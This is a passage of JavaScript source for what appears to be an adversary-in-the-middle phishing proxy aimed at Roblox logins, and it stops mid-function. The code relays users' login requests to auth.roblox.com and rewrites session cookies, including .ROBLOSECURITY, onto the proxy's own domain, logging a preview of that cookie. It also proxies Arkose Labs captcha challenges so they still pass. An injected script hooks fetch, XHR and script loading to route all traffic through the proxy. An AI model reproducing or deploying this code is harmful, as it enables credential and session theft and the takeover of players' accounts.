const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - WITH FULL ARKOSE SUPPORT');
console.log('='.repeat(60));

// Shared HTTPS agent with keep-alive for connection pooling
const httpsAgent = new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000,
    rejectUnauthorized: true
});

const httpAgent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000
});

// Domain map - Roblox APIs
const SUBDOMAIN_MAP = {
    // Core Roblox APIs
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
    'auth-token-service': 'https://auth-token-service.roblox.com',
    'hba-service':    'https://hba-service.roblox.com',
    'proof-of-work-service': 'https://proof-of-work-service.roblox.com',
    'account-security-service': 'https://account-security-service.roblox.com',
    'rotating-client-service': 'https://rotating-client-service.roblox.com',
    'guac-v2':        'https://guac-v2.roblox.com',
    'product-experimentation-platform': 'https://product-experimentation-platform.roblox.com',
    'otp-service':    'https://otp-service.roblox.com',
    'challenge':      'https://challenge.roblox.com',
    'captcha':        'https://captcha.roblox.com',
    'abuse':          'https://abuse.roblox.com',
    'client-telemetry': 'https://client-telemetry.roblox.com',
    'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
    'metrics':        'https://metrics.roblox.com',
    'locale':         'https://locale.roblox.com',
    
    // CRITICAL: rbxcdn.com domains for captcha
    'apis-rbxcdn':    'https://apis.rbxcdn.com',
    'captcha-rbxcdn': 'https://captcha.rbxcdn.com',
    'arkoselabs-rbxcdn': 'https://arkoselabs.roblox.com',
    
    // ARKOSE LABS (FunCaptcha) - Critical for captcha challenges
    'arkose-api':     'https://roblox-api.arkoselabs.com',
    'arkose-client':  'https://client-api.arkoselabs.com',
    'arkose-cdn':     'https://cdn.arkoselabs.com',
    'arkose-ssl':     'https://ssl.arkoselabs.com',
    'arkose-funcaptcha': 'https://funcaptcha.com',
    'arkose-fc':      'https://fc.arkoselabs.com',
    'arkose-fc-cdn':  'https://fc-cdn.arkoselabs.com',
    'arkose-game':    'https://game.arkoselabs.com',
    'arkose-tile':    'https://t.arkoselabs.com',
    'arkose-assets':  'https://assets.arkoselabs.com',
    'arkose-images':  'https://roblox-images.arkoselabs.com',
};

// Reverse map for URL rewriting
const REVERSE_MAP = Object.fromEntries(
    Object.entries(SUBDOMAIN_MAP).map(([k, v]) => [v, k])
);

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    // Strip www. prefix for consistent cookie domain
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?funcaptcha\.com/gi, `Domain=.${cleanHost}`)
            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
    });
}

function getDeviceId(req) {
    const cookies = req.headers.cookie || '';
    const match = cookies.match(/rbx-device-id=([^;]+)/);
    if (match) return match[1];
    return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
}

// Rewrite URLs in challenge metadata (including Arkose URLs)
function rewriteChallengeMetadata(metadata, host) {
    try {
        const decoded = Buffer.from(metadata, 'base64').toString('utf8');
        let data = JSON.parse(decoded);
        
        // Rewrite challenge URL if present
        if (data.challengeUrl) {
            data.challengeUrl = rewriteArkoseUrl(data.challengeUrl, host);
        }
        if (data.challengeBaseUrl) {
            data.challengeBaseUrl = rewriteArkoseUrl(data.challengeBaseUrl, host);
        }
        // Handle fcTokenUrl (Arkose specific)
        if (data.fcTokenUrl) {
            data.fcTokenUrl = rewriteArkoseUrl(data.fcTokenUrl, host);
        }
        
        return Buffer.from(JSON.stringify(data)).toString('base64');
    } catch (e) {
        console.log('   Failed to rewrite challenge metadata:', e.message);
        return metadata;
    }
}

// Rewrite Arkose Labs URLs to proxy
function rewriteArkoseUrl(url, host) {
    if (!url || typeof url !== 'string') return url;
    
    // All domains that need to be proxied
    const domains = [
        // rbxcdn domains
        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
        // Arkose Labs domains
        ['https://roblox-api.arkoselabs.com', `https://${host}/arkose-api`],
        ['https://client-api.arkoselabs.com', `https://${host}/arkose-client`],
        ['https://cdn.arkoselabs.com', `https://${host}/arkose-cdn`],
        ['https://ssl.arkoselabs.com', `https://${host}/arkose-ssl`],
        ['https://funcaptcha.com', `https://${host}/arkose-funcaptcha`],
        ['https://fc.arkoselabs.com', `https://${host}/arkose-fc`],
        ['https://fc-cdn.arkoselabs.com', `https://${host}/arkose-fc-cdn`],
        ['https://game.arkoselabs.com', `https://${host}/arkose-game`],
        ['https://t.arkoselabs.com', `https://${host}/arkose-tile`],
        ['https://assets.arkoselabs.com', `https://${host}/arkose-assets`],
        ['https://roblox-images.arkoselabs.com', `https://${host}/arkose-images`],
        // Roblox challenge domain
        ['https://challenge.roblox.com', `https://${host}/challenge`],
    ];
    
    for (const [from, to] of domains) {
        if (url.startsWith(from)) {
            return url.replace(from, to);
        }
    }
    return url;
}

async function doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, maxRetries = 2) {
    let lastError;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            return await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders);
        } catch (err) {
            lastError = err;
            if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED') {
                console.log(`   Retry ${i + 1}/${maxRetries} after ${err.code}...`);
                await new Promise(r => setTimeout(r, 500 * (i + 1)));
                continue;
            }
            throw err;
        }
    }
    throw lastError;
}

function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
    return new Promise((resolve, reject) => {
        const bodyBuf = Buffer.from(bodyStr, 'utf8');

        const headers = {
            'Content-Type':    'application/json;charset=UTF-8',
            'Content-Length':  bodyBuf.length,
            'Accept':          'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      ua || BROWSER_UA,
            'Connection':      'keep-alive',
        };

        const forwardHeaders = [
            'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
            ...CHALLENGE_HEADERS
        ];
        for (const h of forwardHeaders) {
            if (extraHeaders[h]) headers[h] = extraHeaders[h];
        }

        if (cookieHeader) headers['Cookie'] = cookieHeader;
        if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

        const hasChallengeSolution = !!(extraHeaders['rblx-challenge-metadata'] && extraHeaders['rblx-challenge-id']);
        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Challenge: ${hasChallengeSolution ? 'YES' : 'NO'}`);

        const options = {
            hostname: 'auth.roblox.com',
            path:     '/v2/login',
            method:   'POST',
            headers,
            agent:    httpsAgent,
        };

        const reqOut = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({
                status:  res.statusCode,
                headers: res.headers,
                body:    data,
            }));
        });

        reqOut.on('error', reject);
        reqOut.write(bodyBuf);
        reqOut.end();
    });
}

// =========================
// LOGIN HANDLER
// =========================
app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const host = req.headers.host || 'localhost';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const incomingCookies = req.headers['cookie'] || '';
    const origin = req.headers['origin'] || `https://${host}`;
    const deviceId = getDeviceId(req);

    const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    const hasChallengeId = req.headers['rblx-challenge-id'];
    console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
    
    // Debug: Log all incoming headers for login requests
    console.log('   All incoming headers:');
    for (const [k, v] of Object.entries(req.headers)) {
        if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx') || k.includes('rblx')) {
            const displayValue = typeof v === 'string' 
                ? (v.length > 100 ? v.substring(0, 100) + '...' : v)
                : v;
            console.log(`     ${k}: ${displayValue}`);
        }
    }
    
    // Try to decode challenge metadata for debugging
    if (req.headers['rblx-challenge-metadata']) {
        try {
            const decoded = Buffer.from(req.headers['rblx-challenge-metadata'], 'base64').toString('utf8');
            const meta = JSON.parse(decoded);
            console.log('   Decoded challenge metadata:', meta);
        } catch(e) {
            console.log('   Failed to decode challenge metadata:', e.message);
        }
    }

    try {
        const bodyStr = req.body.toString('utf8');

        if (hasChallengeSolution) {
            console.log('   Forwarding challenge solution to Roblox...');

            let result = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
            console.log(`   Challenge login attempt 1: ${result.status}`);

            if (result.status === 403 && result.headers['x-csrf-token']) {
                const csrfToken = result.headers['x-csrf-token'];
                console.log(`   Got CSRF token, retrying...`);

                let cookieHeader = incomingCookies;
                if (result.headers['set-cookie']) {
                    const extra = result.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }

                result = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
                console.log(`   Challenge login attempt 2: ${result.status}`);
            }

            if (result.status === 200) {
                console.log('✅ LOGIN SUCCESS (with challenge)');
            } else {
                console.log(`❌ LOGIN FAILED: ${result.status}`);
                if (result.headers['rblx-challenge-id']) {
                    console.log('   New challenge required');
                }
            }

            return forwardResponse(res, result, host, origin, deviceId);
        }

        const first = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
        console.log(`   Step 1: ${first.status} | CSRF: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);

        if (!first.headers['x-csrf-token']) {
            return forwardResponse(res, first, host, origin, deviceId);
        }

        const csrfToken = first.headers['x-csrf-token'];
        let cookieHeader = incomingCookies;
        if (first.headers['set-cookie']) {
            const extra = first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }

        const second = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
        console.log(`   Step 2: ${second.status}`);

        let finalResponse = second;
        if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
            const csrfToken2 = second.headers['x-csrf-token'];
            console.log(`   Token rotated, retrying...`);

            if (second.headers['set-cookie']) {
                const extra = second.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }

            const third = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken2, ua, req.headers);
            console.log(`   Step 3: ${third.status}`);
            finalResponse = third;
        }

        if (finalResponse.status === 200) {
            console.log('✅ LOGIN SUCCESS');
        } else if (finalResponse.status === 403 && finalResponse.headers['rblx-challenge-id']) {
            console.log('   🧩 Challenge required');
        } else {
            console.log(`❌ Response: ${finalResponse.status}`);
        }

        forwardResponse(res, finalResponse, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
});

function forwardResponse(res, response, host, origin, deviceId) {
    const status = response.status;
    let body = response.body;
    const headers = response.headers;

    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' : 
                        headers['rbx-challenge-metadata'] ? 'rbx-challenge-metadata' : null;
    if (metadataKey) {
        const original = headers[metadataKey];
        const rewritten = rewriteChallengeMetadata(original, host);
        if (rewritten !== original) {
            console.log('   Rewrote challenge metadata URLs');
            headers[metadataKey] = rewritten;
        }
    }

    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

    const headersToForward = [
        'x-csrf-token',
        'rblx-challenge-id',
        'rblx-challenge-type', 
        'rblx-challenge-metadata',
        'content-type',
        'cache-control',
    ];
    
    for (const key of headersToForward) {
        if (headers[key]) {
            res.set(key, headers[key]);
        }
    }

    const cookies = headers['set-cookie'];
    let allCookies = rewriteCookies(cookies, host) || [];

    // Confirm whether Roblox returned a .ROBLOSECURITY session cookie
    const hasRobloSecurity = (cookies || []).some(c => c.includes('.ROBLOSECURITY'));
    if (hasRobloSecurity) {
        const raw = (cookies || []).find(c => c.includes('.ROBLOSECURITY')) || '';
        const preview = raw.split(';')[0].substring(0, 40) + '...';
        console.log(`✅ .ROBLOSECURITY received — login confirmed! (${preview})`);
    } else if (status === 200) {
        console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY — silent failure`);
    }
    
    if (deviceId) {
        allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
    }
    
    if (allCookies.length > 0) {
        res.set('Set-Cookie', allCookies);
    }

    if (!headers['content-type']) {
        res.set('Content-Type', 'application/json');
    }

    res.status(status).send(body);
}

function buildInjectedScript(host) {
    // Strip www. prefix for consistent URL rewriting
    const cleanHost = host.replace(/^www\./, '');
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${cleanHost}/${prefix}`)}]`)
        .join(',');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${cleanHost}`)};
    var DOMAIN_MAP = [${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com", PROXY_HOST],
        ["https://roblox.com", PROXY_HOST],
        ["http://roblox.com", PROXY_HOST]
    ];
    
    // Arkose Labs domains for captcha
    var ARKOSE_DOMAINS = [
        // rbxcdn domains (CRITICAL!)
        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
        // Arkose Labs domains
        ["https://roblox-api.arkoselabs.com", PROXY_HOST + "/arkose-api"],
        ["https://client-api.arkoselabs.com", PROXY_HOST + "/arkose-client"],
        ["https://cdn.arkoselabs.com", PROXY_HOST + "/arkose-cdn"],
        ["https://ssl.arkoselabs.com", PROXY_HOST + "/arkose-ssl"],
        ["https://funcaptcha.com", PROXY_HOST + "/arkose-funcaptcha"],
        ["https://fc.arkoselabs.com", PROXY_HOST + "/arkose-fc"],
        ["https://fc-cdn.arkoselabs.com", PROXY_HOST + "/arkose-fc-cdn"],
        ["https://game.arkoselabs.com", PROXY_HOST + "/arkose-game"],
        ["https://t.arkoselabs.com", PROXY_HOST + "/arkose-tile"],
        ["https://assets.arkoselabs.com", PROXY_HOST + "/arkose-assets"],
        ["https://roblox-images.arkoselabs.com", PROXY_HOST + "/arkose-images"],
    ];
    
    // Combine all domains — sort longest-first so specific subdomains match before shorter ones
    var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS).sort(function(a, b) {
        return b[0].length - a[0].length;
    });
    
    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < ALL_DOMAINS.length; i++) {
            var from = ALL_DOMAINS[i][0], to = ALL_DOMAINS[i][1];
            if (url.indexOf(from) === 0) return to + url.slice(from.length);
        }
        return url;
    }

    // Load challenge state from sessionStorage (survives page reloads)
    window.__rblxChallengeId = sessionStorage.getItem('__rblxChallengeId') || null;
    window.__rblxChallengeType = sessionStorage.getItem('__rblxChallengeType') || null;
    window.__rblxUserId = sessionStorage.getItem('__rblxUserId') || null;
    window.__rblxBrowserTrackerId = sessionStorage.getItem('__rblxBrowserTrackerId') || null;
    window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
    window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
    window.__rblxCaptchaToken = sessionStorage.getItem('__rblxCaptchaToken') || null;
    
    if (window.__rblxChallengeId) {
        log('Restored challenge state from sessionStorage', {
            id: window.__rblxChallengeId, 
            type: window.__rblxChallengeType,
            solved: window.__rblxChallengeSolved,
            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
        });
    }

    function log(msg, data) {
        console.log('[Proxy]', msg, data || '');
    }
    
    function saveChallengeState() {
        if (window.__rblxChallengeId) sessionStorage.setItem('__rblxChallengeId', window.__rblxChallengeId);
        if (window.__rblxChallengeType) sessionStorage.setItem('__rblxChallengeType', window.__rblxChallengeType);
        if (window.__rblxUserId) sessionStorage.setItem('__rblxUserId', window.__rblxUserId);
        if (window.__rblxBrowserTrackerId) sessionStorage.setItem('__rblxBrowserTrackerId', window.__rblxBrowserTrackerId);
        if (window.__rblxChallengeToken) sessionStorage.setItem('__rblxChallengeToken', window.__rblxChallengeToken);
        if (window.__rblxCaptchaToken) sessionStorage.setItem('__rblxCaptchaToken', window.__rblxCaptchaToken);
        sessionStorage.setItem('__rblxChallengeSolved', window.__rblxChallengeSolved ? 'true' : 'false');
    }

    function constructSolutionMetadata() {
        // Check if we have a captcha token (for captcha challenges)
        if (window.__rblxCaptchaToken && window.__rblxChallengeId) {
            var data = {
                unifiedCaptchaId: window.__rblxChallengeId,
                captchaToken: window.__rblxCaptchaToken,
                actionType: "Login"
            };
            var encoded = btoa(JSON.stringify(data));
            log('Constructed CAPTCHA solution metadata', {encoded: encoded.substring(0, 50) + '...'});
            return encoded;
        }
        
        // Standard challenge metadata (for proofofwork, etc.)
        if (!window.__rblxChallengeId || !window.__rblxUserId) {
            log('Cannot construct metadata - missing challengeId or userId', {
                challengeId: window.__rblxChallengeId, 
                userId: window.__rblxUserId
            });
            return null;
        }
        var data = {
            userId: window.__rblxUserId,
            challengeId: window.__rblxChallengeId,
            browserTrackerId: window.__rblxBrowserTrackerId || ''
        };
        var encoded = btoa(JSON.stringify(data));
        log('Constructed solution metadata', {data: data, encoded: encoded.substring(0, 50) + '...'});
        return encoded;
    }
    
    // Debug: Log challenge state periodically
    setInterval(function() {
        if (window.__rblxChallengeId) {
            log('Challenge state', {
                id: window.__rblxChallengeId, 
                type: window.__rblxChallengeType, 
                solved: window.__rblxChallengeSolved,
                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
            });
        }
    }, 5000);

    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        var url = typeof resource === 'string' ? resource : resource.url;
        var rewrittenUrl = rewriteUrl(url);
        
        init = init || {};
        init.credentials = 'include';

        // AGGRESSIVE: Always check for login endpoint and add challenge headers if available
        var isLoginRequest = url.includes('/v2/login') || url.includes('/auth-api/v2/login') || rewrittenUrl.includes('/auth-api/v2/login');
        var isChallengeContinue = url.includes('challenge/v1/continue') || rewrittenUrl.includes('challenge/v1/continue');
        
        if (isLoginRequest) {
            log('Login request detected!', {
                url: url, 
                rewritten: rewrittenUrl,
                solved: window.__rblxChallengeSolved,
                hasId: !!window.__rblxChallengeId,
                hasUserId: !!window.__rblxUserId,
                hasCaptchaToken: !!window.__rblxCaptchaToken
            });
            
            // If we have challenge data, ALWAYS add it to login requests
            if (window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
                var solutionMetadata = constructSolutionMetadata();
                if (solutionMetadata) {
                    init.headers = init.headers || {};
                    // If resource is a Request, copy its headers first
                    if (typeof resource !== 'string' && resource.headers) {
                        resource.headers.forEach(function(value, key) {
                            if (!init.headers[key]) init.headers[key] = value;
                        });
                    }
                    init.headers['rblx-challenge-id'] = window.__rblxChallengeId;
                    init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'chef';
                    init.headers['rblx-challenge-metadata'] = solutionMetadata;
                    init.headers['x-retry-attempt'] = '1';
                    log('ADDED challenge headers to login!', {id: window.__rblxChallengeId, type: window.__rblxChallengeType});
                }
            } else {
                log('No challenge data available for login');
            }
        }
        
        // Handle challenge continue requests - check for chained challenges
        if (isChallengeContinue) {
            log('Challenge continue request detected', {url: url});
        }
        
        // Now create the resource with merged headers
        if (typeof resource === 'string') {
            resource = rewrittenUrl;
        } else if (resource && resource.url) {
            resource = new Request(rewrittenUrl, init);
            // Clear init since we already applied it to the Request
            init = undefined;
        }

        return _fetch.call(this, resource, init).then(function(response) {
            var clonedResponse = response.clone();
            
            // Debug: Log all responses to challenge/login endpoints
            if (url.includes('challenge') || url.includes('login') || url.includes('auth')) {
                log('Response:', {url: url, status: response.status, solved: window.__rblxChallengeSolved});
            }

            var challengeId = response.headers.get('rblx-challenge-id');
            var challengeType = response.headers.get('rblx-challenge-type');
            var challengeMetadata = response.headers.get('rblx-challenge-metadata');

            if (challengeId && challengeMetadata) {
                log('Challenge required (from headers):', {id: challengeId, type: challengeType});
                window.__rblxChallengeId = challengeId;
                window.__rblxChallengeType = challengeType;
                window.__rblxChallengeSolved = false;
                window.__rblxCaptchaToken = null; // Reset captcha token for new challenge
                try {
                    var metaStr = atob(challengeMetadata);
                    var meta = JSON.parse(metaStr);
                    window.__rblxUserId = meta.userId;
                    window.__rblxBrowserTrackerId = meta.browserTrackerId;
                    log('Extracted from metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId, meta: meta});
                    // Save immediately
                    saveChallengeState();
                    log('Challenge state saved after metadata extraction');
                } catch(e) {
                    log('Failed to parse challenge metadata:', e.message, challengeMetadata.substring(0, 100));
                }
            }

            // Check for challenge continue response - HANDLE CHAINED CHALLENGES
            if (isChallengeContinue) {
                clonedResponse.text().then(function(text) {
                    try {
                        var data = JSON.parse(text);
                        log('Challenge continue response body:', data);
                        
                        // Check if response contains a NEW challenge (chained challenges)
                        if (data.challengeType && data.challengeType !== '') {
                            log('CHAINED CHALLENGE detected! New challenge type:', data.challengeType);
                            window.__rblxChallengeId = data.challengeId;
                            window.__rblxChallengeType = data.challengeType;
                            window.__rblxChallengeSolved = false;
                            window.__rblxCaptchaToken = null;
                            
                            // Parse the new challenge metadata
                            if (data.challengeMetadata) {
                                try {
                                    var meta = JSON.parse(data.challengeMetadata);
                                    log('New challenge metadata:', meta);
                                    
                                    // Handle captcha challenge specifically
                                    if (data.challengeType === 'captcha') {
                                        log('CAPTCHA challenge detected - waiting for user to solve');
                                    }
                                } catch(e) {
                                    log('Failed to parse chained challenge metadata:', e.message);
                                }
                            }
                            saveChallengeState();
                        } else if (response.status === 200) {
                            // No new challenge type, this challenge is complete
                            log('Challenge continue succeeded! Marking as solved', {url: url});
                            window.__rblxChallengeSolved = true;
                            saveChallengeState();
                            sessionStorage.setItem('__rblxChallengeSolved', 'true');
                            
                            if (data.challengeToken) {
                                window.__rblxChallengeToken = data.challengeToken;
                                sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
                                log('Stored challenge token from continue response');
                            }
                        }
                    } catch(e) {
                        log('Failed to parse challenge continue response:', e.message);
                    }
                }).catch(function(err) {
                    log('Failed to read challenge continue response:', err);
                });
            }

            return response;
        });
    };

    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        this.__rblxUrl = args[1];
        return _open.apply(this, args);
    };

    var _setRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
        this.__rblxHeaders = this.__rblxHeaders || {};
        this.__rblxHeaders[header.toLowerCase()] = value;
        return _setRequestHeader.call(this, header, value);
    };

    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        this.withCredentials = true;
        
        // AGGRESSIVE: Check for login endpoint
        var isLoginUrl = this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('/auth-api/v2/login'));
        var isChallengeContinue = this.__rblxUrl && this.__rblxUrl.includes('challenge/v1/continue');
        
        // Debug: Log all XHR requests to login/challenge endpoints
        if (isLoginUrl || isChallengeContinue) {
            log('XHR send:', {url: this.__rblxUrl, solved: window.__rblxChallengeSolved, id: window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
        }

        // AGGRESSIVE: If we have challenge data, ALWAYS add it to login requests
        if (isLoginUrl && window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
            var solutionMetadata = constructSolutionMetadata();
            if (solutionMetadata) {
                var hasChallengeHeader = this.__rblxHeaders && this.__rblxHeaders['rblx-challenge-metadata'];
                if (!hasChallengeHeader) {
                    _setRequestHeader.call(this, 'rblx-challenge-id', window.__rblxChallengeId);
                    _setRequestHeader.call(this, 'rblx-challenge-type', window.__rblxChallengeType || 'chef');
                    _setRequestHeader.call(this, 'rblx-challenge-metadata', solutionMetadata);
                    _setRequestHeader.call(this, 'x-retry-attempt', '1');
                    log('XHR: ADDED challenge headers to login!', {id: window.__rblxChallengeId, url: this.__rblxUrl});
                } else {
                    log('XHR: Challenge headers already present', {url: this.__rblxUrl});
                }
            }
        } else if (isLoginUrl) {
            log('XHR: Login request but no challenge data', {hasId: !!window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
        }

        var self = this;
        var originalOnReadyStateChange = this.onreadystatechange;
        this.onreadystatechange = function() {
            if (self.readyState === 4) {
                // Debug: Log all XHR responses
                if (self.__rblxUrl && (self.__rblxUrl.includes('login') || self.__rblxUrl.includes('challenge'))) {
                    log('XHR response:', {url: self.__rblxUrl, status: self.status});
                }
                
                // Handle challenge continue response for XHR
                if (isChallengeContinue) {
                    try {
                        var text = self.responseText;
                        var data = JSON.parse(text);
                        log('XHR Challenge continue response:', data);
                        
                        // Check for chained challenge
                        if (data.challengeType && data.challengeType !== '') {
                            log('XHR CHAINED CHALLENGE detected! Type:', data.challengeType);
                            window.__rblxChallengeId = data.challengeId;
                            window.__rblxChallengeType = data.challengeType;
                            window.__rblxChallengeSolved = false;
                            window.__rblxCaptchaToken = null;
                            saveChallengeState();
                        } else if (self.status === 200) {
                            log('XHR Challenge continue succeeded, marking as solved');
                            window.__rblxChallengeSolved = true;
                            saveChallengeState();
                        }
                    } catch(e) {
                        // Ignore parse errors
                    }
                }
                
                var challengeId = self.getResponseHeader('rblx-challenge-id');
                var challengeType = self.getResponseHeader('rblx-challenge-type');
                var challengeMetadata = self.getResponseHeader('rblx-challenge-metadata');
                if (challengeId && challengeMetadata) {
                    log('XHR Challenge required (from headers):', {id: challengeId, type: challengeType});
                    window.__rblxChallengeId = challengeId;
                    window.__rblxChallengeType = challengeType;
                    window.__rblxChallengeSolved = false;
                    window.__rblxCaptchaToken = null;
                    try {
                        var metaStr = atob(challengeMetadata);
                        var meta = JSON.parse(metaStr);
                        window.__rblxUserId = meta.userId;
                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
                        log('XHR Extracted metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId});
                    } catch(e) {
                        log('XHR Failed to parse metadata:', e.message);
                    }
                    saveChallengeState();
                }
            }
            if (originalOnReadyStateChange) return originalOnReadyStateChange.apply(this, arguments);
        };

        return _send.apply(this, arguments);
    };

    // Also intercept Arkose Labs script loading
    var originalCreateElement = document.createElement;
    document.createElement = function(tagName) {
        var element = originalCreateElement.call(document, tagName);
        if (tagName.toLowerCase() === 'script') {
            var originalSetAttribute = element.setAttribute;
            element.setAttribute = function(name, value) {
                if (name === 'src' && value) {
                    value = rewriteUrl(value);
                }
                return originalSetAttribute.call(this, name, value);
            };
            Object.defineProperty(element, 'src', {
                set: function(value) {
                    this.setAttribute('src', rewriteUrl(value));
                },
                get: function() {
                    return this.getAttribute('src');
                }
            });
        }
        if (tagName.toLowerCase() === 'iframe') {
            var originalSetAttribute = element.setAttribute;
            element.setAttribute = function(name, value) {
                if ((name === 'src' || name === 'data-src') && value) {
                    value = rewriteUrl(value);
                }
                return originalSetAttribute.call(this, name, value);
            };
        }
        return element;
    };
    
    // Helper to set captcha token (called by Arkose callback)
    window.setRblxCaptchaToken = function(token) {
        log('Captcha token received from Arkose!', {token: token.substring(0, 30) + '...'});
        window.__rblxCaptchaToken = token;
        window.__rblxChallengeSolved = true;
        saveChallengeState();
        
        // Trigger a new challenge/continue request with the captcha token
